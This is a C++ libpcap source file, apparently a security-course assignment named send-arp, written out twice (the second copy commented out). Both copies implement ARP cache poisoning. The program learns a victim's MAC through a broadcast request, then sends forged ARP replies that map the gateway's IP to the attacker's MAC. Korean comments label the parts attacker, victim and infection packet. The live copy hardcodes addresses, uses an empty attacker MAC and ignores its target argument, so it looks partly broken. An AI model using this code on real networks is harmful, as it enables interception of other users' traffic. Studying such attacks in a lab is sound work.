#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac myMac = Mac("");  // 공격자 MAC (하드코딩)
    Ip  myIp  = Ip("172.20.10.3");         // 공격자 IP (하드코딩)
    Ip  gatewayIp = Ip("192.168.170.2");
    int pairs = (argc - 2) / 2;
    for (int i = 0; i < pairs; i++) {
        char* senderIp = argv[2 + 2*i];
        char* targetIp = argv[2 + 2*i + 1];

        EthArpPacket s_packet;  // sending packet 1. 우선, 제대로된 패킷을 보내서 상대의 mac주소를 확인함.
        struct pcap_pkthdr* header;     // 2. reply를 통해 victim의 mac주소를 알아내야함.
        const u_char* r_packet;


        s_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 (victim MAC 모르니까)
        s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
        s_packet.eth_.type_ = htons(EthHdr::Arp);       // type eth
        s_packet.arp_.hrd_  = htons(ArpHdr::ETHER);     // Hardware type을 ETHER로 지정
        s_packet.arp_.pro_  = htons(EthHdr::Ip4);       // Protocol type을 IPv4로 지정
        s_packet.arp_.hln_  = Mac::Size;                // Hardware length를 Mac의 size(6바이트)로 지정
        s_packet.arp_.pln_  = Ip::Size;                 // Protocol length를 IPv4의 size(4바이트)로 지정
        s_packet.arp_.op_   = htons(ArpHdr::Request);   // Operation ARP를 request로 지정
        s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
        s_packet.arp_.sip_  = htonl(myIp);              // source(attacker)의 ip address (내 IP)
        s_packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target(victim)의 mac (아직 모름, 현재는 unknown)
        s_packet.arp_.tip_  = htonl(Ip(senderIp));      // target(victim)의 ip (이걸로 보내는 것)

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            continue;
        }

        res = pcap_next_ex(pcap, &header, &r_packet);
        if (res != 1) {
            fprintf(stderr, "pcap_next_ex failed\n");
                                                            
            continue;
        }

        EthHdr* eth = (EthHdr*)r_packet;
        ArpHdr* arp = (ArpHdr*)(r_packet + sizeof(EthHdr));

        s_packet.eth_.dmac_ = eth->smac_;               // target(victim)의 mac address
        s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
        s_packet.eth_.type_ = htons(EthHdr::Arp);       // type eth
        s_packet.arp_.hrd_  = htons(ArpHdr::ETHER);     // Hardware type을 ETHER로 지정
        s_packet.arp_.pro_  = htons(EthHdr::Ip4);       // Protocol type을 IPv4로 지정
        s_packet.arp_.hln_  = Mac::Size;                // Hardware length를 Mac의 size(6바이트)로 지정
        s_packet.arp_.pln_  = Ip::Size;                 // Protocol length를 IPv4의 size(4바이트)로 지정
        s_packet.arp_.op_   = htons(ArpHdr::Reply);     // Operation ARP를 reply로 지정
        s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
        s_packet.arp_.sip_  = htonl(gatewayIp);      // gateway의 ip address
        s_packet.arp_.tmac_ = arp->smac_;               // target(victim)의 mac
        s_packet.arp_.tip_  = htonl(Ip(senderIp));      // target(victim)의 ip

        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }
    }

    pcap_close(pcap);
    return 0;
}
                                               

// #include <cstdio>
// #include <pcap.h>
// #include "ethhdr.h"
// #include "arphdr.h"

// #pragma pack(push, 1)
// struct EthArpPacket final {
//     EthHdr eth_;
//     ArpHdr arp_;
// };
// #pragma pack(pop)

// void usage() {
//     printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
//     printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
// }

// int main(int argc, char* argv[]) {
//     if (argc < 4 || argc % 2 != 0) {
//         usage();
//         return EXIT_FAILURE;
//     }

//     char* dev = argv[1];
//     char errbuf[PCAP_ERRBUF_SIZE];
//     pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
//     if (pcap == nullptr) {
//         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
//         return EXIT_FAILURE;
//     }

//     Mac myMac     = Mac("a0:47:d7:d0:28:7d");  // 공격자 MAC (하드코딩)
//     Ip  myIp      = Ip("172.20.10.10");          // 공격자 IP (하드코딩)

//     int pairs = (argc - 2) / 2;
//     for (int i = 0; i < pairs; i++) {
//         char* senderIp = argv[2 + 2*i];       // sender(victim) IP
//         char* targetIp = argv[2 + 2*i + 1];   // target(gateway) IP

//         EthArpPacket s_packet;  // sending packet 1. 우선, 제대로된 패킷을 보내서 상대의 mac주소를 확인함.
//         struct pcap_pkthdr* header;     // 2. reply를 통해 victim의 mac주소를 알아내야함.
//         const u_char* r_packet;

//         // ===== 1단계: ARP Request (sender MAC 알아내기) =====
//         s_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 브로드캐스트 (victim MAC 모르니까)
//         s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
//         s_packet.eth_.type_ = htons(EthHdr::Arp);       // type eth
//         s_packet.arp_.hrd_  = htons(ArpHdr::ETHER);     // Hardware type을 ETHER로 지정
//         s_packet.arp_.pro_  = htons(EthHdr::Ip4);       // Protocol type을 IPv4로 지정
//         s_packet.arp_.hln_  = Mac::Size;                // Hardware length를 Mac의 size(6바이트)로 지정
//         s_packet.arp_.pln_  = Ip::Size;                 // Protocol length를 IPv4의 size(4바이트)로 지정
//         s_packet.arp_.op_   = htons(ArpHdr::Request);   // Operation ARP를 request로 지정
//         s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
//         s_packet.arp_.sip_  = htonl(myIp);              // source(attacker)의 ip address (내 IP)
//         s_packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target(victim)의 mac (아직 모름, 현재는 unknown)
//         s_packet.arp_.tip_  = htonl(Ip(senderIp));      // target(victim)의 ip (이걸로 보내는 것)

//         int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
//         if (res != 0) {
//             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
//             continue;
//         }

//         // ===== 2단계: ARP Reply 수신 (올바른 Reply 올 때까지 루프) =====
//         while (true) {
//             res = pcap_next_ex(pcap, &header, &r_packet);
//             if (res == 0) continue;  // 타임아웃
//             if (res == -1) {
//                 fprintf(stderr, "pcap_next_ex failed\n");
//                 break;
//             }

//             EthHdr* eth = (EthHdr*)r_packet;
//             ArpHdr* arp = (ArpHdr*)(r_packet + sizeof(EthHdr));

//             // ARP Reply인지 확인
//             if (ntohs(eth->type_) != EthHdr::Arp) continue;      // ARP 아니면 스킵
//             if (ntohs(arp->op_) != ArpHdr::Reply) continue;      // Reply 아니면 스킵
//             if (arp->sip_ != htonl(Ip(senderIp))) continue;      // sender IP 맞는지 확인

//             // ===== 3단계: Infection Reply 패킷 구성 =====
//             s_packet.eth_.dmac_ = eth->smac_;               // target(victim)의 mac address
//             s_packet.eth_.smac_ = myMac;                    // source(attacker)의 mac address 일단은 내 mac주소.
//             s_packet.eth_.type_ = htons(EthHdr::Arp);       // type eth
//             s_packet.arp_.hrd_  = htons(ArpHdr::ETHER);     // Hardware type을 ETHER로 지정
//             s_packet.arp_.pro_  = htons(EthHdr::Ip4);       // Protocol type을 IPv4로 지정
//             s_packet.arp_.hln_  = Mac::Size;                // Hardware length를 Mac의 size(6바이트)로 지정
//             s_packet.arp_.pln_  = Ip::Size;                 // Protocol length를 IPv4의 size(4바이트)로 지정
//             s_packet.arp_.op_   = htons(ArpHdr::Reply);     // Operation ARP를 reply로 지정
//             s_packet.arp_.smac_ = myMac;                    // source(attacker)의 mac address (내 mac)
//             s_packet.arp_.sip_  = htonl(Ip(targetIp));      // gateway의 ip address
//             s_packet.arp_.tmac_ = arp->smac_;               // target(victim)의 mac
//             s_packet.arp_.tip_  = htonl(Ip(senderIp));      // target(victim)의 ip

//             // ===== 4단계: Infection 패킷 전송 =====
//             res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&s_packet), sizeof(EthArpPacket));
//             if (res != 0) {
//                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
//             } else {
//                 printf("Infection packet sent to %s!\n", senderIp);
//             }
//             break;  // Reply 받았으면 탈출
//         }
//     }

//     pcap_close(pcap);
//     return 0;
// }
